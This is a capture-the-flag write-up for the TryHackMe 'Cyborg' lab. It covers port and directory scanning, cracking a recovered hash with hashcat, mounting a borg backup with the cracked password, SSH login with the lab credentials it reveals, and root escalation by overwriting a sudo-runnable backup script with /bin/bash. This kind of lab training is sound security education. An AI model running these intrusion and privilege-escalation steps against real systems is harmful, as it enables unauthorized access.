# Cyborg

**Room Link:** [https://tryhackme.com/room/cyborgt8](https://tryhackme.com/room/cyborgt8)

## Scanning

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>







### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>



### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

## Hash

**Link:** [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example\_hashes)

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
hashcat -m 1600 password /usr/share/wordlists/rockyou.txt
hashcat -m 1600 password --show
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sudo apt install borgbackup -y
mkdir backup
borg mount home/field/dev/final_archive backup
Password: squidward
```

Within the backup I can see credentials for alex

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh alex@$VICTIM
Password: S3cretP@s3
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**

**Victim**

```
chmod 777 /etc/mp3backups/backup.sh
echo "/bin/bash" > /etc/mp3backups/backup.sh
sudo /etc/mp3backups/backup.sh 
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>










